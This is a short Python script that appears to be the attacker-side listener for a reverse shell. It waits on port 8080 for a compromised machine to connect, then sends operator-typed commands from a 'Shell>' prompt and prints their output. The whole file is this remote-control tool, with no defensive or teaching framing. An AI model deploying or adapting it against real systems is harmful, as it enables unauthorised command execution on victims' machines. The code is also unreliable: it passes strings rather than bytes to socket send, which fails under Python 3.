import socket 
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("IP", 8080)) #Locak Machine IP
    s.listen(1)
    
    print ('[+] Listening on port 8080')
    
    conn, addr = s.accept() 

    print ('[+] We got a connection from: ', addr)
    while True:
        command = input("Shell> ") 
        if 'terminate' in command: 
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print(conn.recv(1024))

def main ():
    connect()

main()
